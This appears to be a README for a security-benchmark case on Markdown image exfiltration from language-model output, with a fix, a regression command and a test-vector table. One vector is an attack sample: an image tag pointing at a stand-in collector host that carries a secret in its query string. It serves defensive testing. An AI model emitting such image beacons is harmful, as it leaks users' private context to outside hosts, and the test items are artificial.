# Markdown image exfiltration

Rendering unfiltered Markdown image tags in model output triggers client requests that exfiltrate sensitive context in URL query parameters.

| Attribute | Value |
|---|---|
| Technology | AI / LLM boundaries |
| CWE | CWE-200 |
| OWASP | LLM02:2025, LLM05:2025 |
| Test scope | `ai-boundary-unit` |

[Vulnerable source](vulnerable/main.py) · [Corrected source](fixed/main.py)

## Correction

Reject or strip external Markdown image syntax and untrusted URLs from model responses before rendering.

## Regression

```sh
python3 tools/lab.py test --case ai/markdown-image-exfiltration --strict
```

Run from the repository root. Exact inputs and expected outputs are in
[the catalog](../../../catalog/cases.json). Both variants are tested.

The runner also checks every declared file effect. `functional` vectors can specify a useful
operation that the vulnerable implementation did not support correctly; `robustness` vectors
exercise malformed inputs. `benign` vectors require identical expectations.

| Vector | Type | Vulnerable expectation | Fixed expectation |
|---|---|---|---|
| plain text summary | benign | {"equals": {"rendered": "Summary: 3 open tickets in queue."}} | {"equals": {"rendered": "Summary: 3 open tickets in queue."}} |
| markdown image beacon exfiltration | attack | {"equals": {"rendered": "![beacon](https://collector.invalid/leak?secret=LAB_SECRET)"}} | {"equals": "DENIED"} |

This example demonstrates the declared weakness within the documented fixture assumptions.
It is not a production application or a proof that every related attack is prevented.

[Technology index](../README.md) · [Benchmark methodology](../../../docs/BENCHMARK.md)
